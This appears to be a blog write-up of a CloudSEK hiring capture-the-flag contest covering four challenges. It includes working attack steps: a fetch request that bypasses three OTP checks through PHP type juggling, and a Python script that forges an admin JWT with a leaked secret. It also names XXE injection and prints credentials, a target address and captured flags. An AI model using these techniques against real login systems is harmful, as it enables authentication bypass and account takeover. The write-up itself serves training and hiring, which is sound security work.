# :game_die: CloudSEK Hiring CTF Writeup. During this weekend (Saturday), I…

---

# CloudSEK Hiring CTF Writeup

During this weekend (Saturday), I participated in the CloudSek Hiring CTF, which consisted of four challenges focused on practical skills in web exploitation and scripting. In this write-up, I’ve combined all four challenge solutions into a single article — covering the process, exploitation techniques, and final outcomes for each one.

## Challenge 1Challenge Name: Nitro
Category: Scripting

Points: 100

Challenge site :

From the challenge description it tells that to visit /task and the server will return a random string in HTML snippet.

We need to reverse this string and reverse the base64 encode string.

Also we need to wrap it as : *CSK__{{payload}}__2025*

After POST this wrapped payload to /submit before timer expires that means manual is too slow and we need to automate it by generating a script.

So we must write a script that can automatically fetch the /task , Extract the string, Reverse it, Base 64 encode the string, wrap it and post it to the format CSK__{{payload}}__2025 also the loop must be continued until the flag is received.

So I automated this string using Python and request.Session() to maintain cookies.

```
import time
import re
import base64
import sys
import requests
from html import unescape

# Configure target
BASE_URL = "http://15.206.47.5:9090"
TASK_PATH = "/task"
SUBMIT_PATH = "/submit"

# How long to wait between iterations (seconds). Keep small but non-zero to be polite.
SLEEP_BETWEEN = 0.08

# (Optional) stop after N attempts; set to None to run forever
MAX_ATTEMPTS = None

# Regex to find a likely random token in the HTML response.
# This is permissive: letters, digits, +, /, = (base64-ish) and punctuation.
TOKEN_RE = re.compile(r"([A-Za-z0-9+/=._-]{6,200})")

# (Optional) regex for detecting flag in server response; adjust if needed.
FLAG_RE = re.compile(r"(FLAG\{.*?\}|CSK\{.*?\}|[A-Za-z0-9_\-]{10,})", re.IGNORECASE)

session = requests.Session()
session.headers.update({
"User-Agent": "nitro-automation/1.0"
})

def fetch_task():
"""GET /task and return the response text"""
url = BASE_URL + TASK_PATH
r = session.get(url, timeout=5)
r.raise_for_status()
return r.text

def extract_token(html_text):
"""
Try to extract the random string from the HTML snippet.
We unescape HTML and search for a token-like substring.
If the server uses a specific tag, you may want to tighten this.
"""
text = unescape(html_text)
# Remove HTML tags for easier token discovery
text_no_tags = re.sub(r"<[^>]+>", " ", text)
candidates = TOKEN_RE.findall(text_no_tags)
# Heuristic: pick the longest candidate (likely the random string)
if not candidates:
return None
candidates = sorted(set(candidates), key=len, reverse=True)
return candidates[0].strip()

def make_payload(token_str):
"""
Reverse the token, base64-encode the reversed bytes, and wrap as requested:
CSK__{payload}__2025
"""
# Ensure token is a str
token_str = token_str.strip()
reversed_str = token_str[::-1]
# Base64 encode the reversed string bytes
b64 = base64.b64encode(reversed_str.encode("utf-8")).decode("ascii")
payload = f"CSK__{b64}__2025"
return payload

def submit_answer(payload):
"""
Submit payload to /submit.

The challenge tip says "Use raw text or form fields". We'll try form field first,
with fallback to raw text if server expects raw body.

Returns the server response text.
"""
url = BASE_URL + SUBMIT_PATH

# Try as form field named 'answer' (common)
try:
r = session.post(url, data={"answer": payload}, timeout=5)
except Exception as e:
# fallback to raw body if network error
r = None

# If we got a response but it's a "bad method" or not accepted, try raw text
if r is None or r.status_code >= 400:
r = session.post(url, data=payload.encode("utf-8"), headers={"Content-Type": "text/plain"}, timeout=5)

# Return response status and text
return r.status_code, r.text

def looks_like_flag(text):
if not text:
return False
if "too slow" in text.lower():
return False
# If the server returns a clear flag string or some success message, this will catch it.
return bool(FLAG_RE.search(text))

def main():
attempt = 0
print(f"[+] Starting nitro automation against {BASE_URL}")
try:
while MAX_ATTEMPTS is None or attempt < (MAX_ATTEMPTS or 0):
attempt += 1
try:
html = fetch_task()
except Exception as e:
print(f"[-] Failed to fetch /task: {e}")
time.sleep(0.5)
continue

token = extract_token(html)
if not token:
print(f"[-] Could not find token on attempt {attempt}. Raw page snippet:")
snippet = html[:400].replace("\n"," ")
print(snippet)
time.sleep(SLEEP_BETWEEN)
continue

payload = make_payload(token)
status, resp_text = submit_answer(payload)
# Print compact info
print(f"[{attempt:04d}] token={token[:30]}... payload_len={len(payload)} status={status}")

# Show server reply (first line)
preview = resp_text.strip().splitlines()
if preview:
print(" ->", preview[0][:300])

# Check success condition
if looks_like_flag(resp_text):
print("\n[+] Likely flag or success response received:")
print(resp_text.strip())
break

# If server explicitly says "too slow" we might want to retry immediately or adjust timing
if "too slow" in resp_text.lower():
print(" [!] Server says 'too slow' — consider lowering delay or speeding up network.")
# continue looping; the session timer might reset on next /task

time.sleep(SLEEP_BETWEEN)

except KeyboardInterrupt:
print("\n[!] Interrupted by user. Exiting.")
sys.exit(0)

if __name__ == "__main__":
main()
```

And got the flag:

Flag is:

ClOuDsEk_ReSeArCH_tEaM_CTF_2025{ab03730caf95ef90a440629bf12228d4}

## Challenge 2Challenge Name: Bad feedback

Category: Web exploitation

Points: 100

Challenge site :

While analysing the page source code, I noticed the form data wasn’t sent normally. Instead, a JavaScript function manually constructed an XML payload and sent it via a POST request.

Since the description mentioned the server “trusts all input,” this setup is a textbook case for XML External Entity (XXE) Injection.

To get the flag from the root, I needed to inject a malicious DOCTYPE with a system entity. I used the DevTools console to send a custom fetch request with the XML payload.

Console Command used :

## Challenge 3

Challenge Name: TriangleCategory: Web exploitationPoints: 100

Challenge site :

The challenge presented a login page requiring a Username, Password, and three separate OTPs. Inspecting the page source, I found a developer comment mentioning a “TODO” and “bak files.”

*Hint*

Based on this hint, I navigated to / login.php.bak and successfully downloaded the server-side source code.

```
<?php

require('google2fa.php');
require('jsonhandler.php');

$FLAG = "";
if (isset($_ENV['FLAG'])) {
$FLAG = $_ENV['FLAG'];
}

$USER_DB = [
// Set the initial user
"admin" => [
"password_hash" => password_hash("admin", PASSWORD_DEFAULT),
"key1" => Google2FA::generate_secret_key(),
"key2" => Google2FA::generate_secret_key(),
"key3" => Google2FA::generate_secret_key()
]
];

if (isset($_DATA['username'])) {

if (!isset($USER_DB[$_DATA['username']])) {
json_die('wrong username', 'username');
}

$user_data = $USER_DB[$_DATA['username']];

if (!password_verify($_DATA['password'], $user_data['password_hash'])) {
json_die('wrong password', 'password');
}

if (!Google2FA::verify_key($user_data['key1'], $_DATA['otp1'])) {
json_die('wrong otp1', 'otp1');
}
if (!Google2FA::verify_key($user_data['key2'], $_DATA['otp2'])) {
json_die('wrong otp2', 'otp2');
}
if (!Google2FA::verify_key($user_data['key3'], $_DATA['otp3'])) {
json_die('wrong otp3', 'otp3');
}

json_response("Flag: " . $FLAG);
}

json_response("OK");
```

While analysing the login.php.bak I found out 2 critical things :

- Credentials — username : admin , password : admin

- And juggling vulnerability — application handles JSON input.The verify_key function compares the correct OTP (a string) with the user input. In PHP, a loose comparison between a non-empty string and the boolean true returns True.

So to bypass the 3 OTP checks, I created a JSON POST request with the credentials i got and set the OTP field to value true.

## Get Shibzzz’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Console Command Used :

```
fetch("/login.php", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({
username: "admin",
password: "admin",
otp1: true,
otp2: true,
otp3: true
})
})
.then(r => r.json())
.then(console.log);
```

Got the flag : ClOuDsEk_ReSeArCH_tEaM_CTF_2025{474a30a63ef1f14e252dc0922f811b16}

## Challenge 4

Challenge Name: Ticket

Category: Web exploitation

Points: 100

The Website path is given , the path is
[https://bevigil.com/report/com.strikebank.netbanking](https://bevigil.com/report/com.strikebank.netbanking)

So while going through each category given on the website of the SecureBank application, from the assets section I found a URL of the bank.

[http://15.206.47.5.nip.io:844](http://15.206.47.5.nip.io:844)

Also while analysing the assets section I found encoded_jwt_token

Which decoded to the key : str!k3b4nk@1009%sup3r!s3cr37

And from the strings section I found the user credentials to login.

Username : tuhin1729Password : 123456

Let’s try accessing it.

After logging in the web page is just giving a index.php and no other information.

While analysing I found out the web portal uses JSON Web Tokens (JWT) for session management.

So I intercepted the login page using Burpsuite and captured the auth token of the current user.

I used the secret key that we found earlier to generate the Admin Token . Here is the script :

```
import jwt
import datetime

```

```
# 1. The Full Secret you found
secret = "str!k3b4nk@1009%sup3r!s3cr37"
# 2. Create the Admin Payload
payload = {
"username": "admin",
# Set expiration to 1 year in the future so it doesn't expire
"exp": datetime.datetime.utcnow() + datetime.timedelta(days=365)
}
# 3. Generate the Token
admin_token = jwt.encode(payload, secret, algorithm="HS256")
print("\n" + "="*50)
print("YOUR ADMIN TOKEN:")
print("="*50)
print(admin_token)
print("="*50)
```

And the result is :

Let’s change the token in Repeater of Burpsuite:

Hurray we found the flag.

The flag is : ClOuDsEk_ReSeArCH_tEaM_CTF_2025{ccf62117a030691b1ac7013fca4fb685}

---
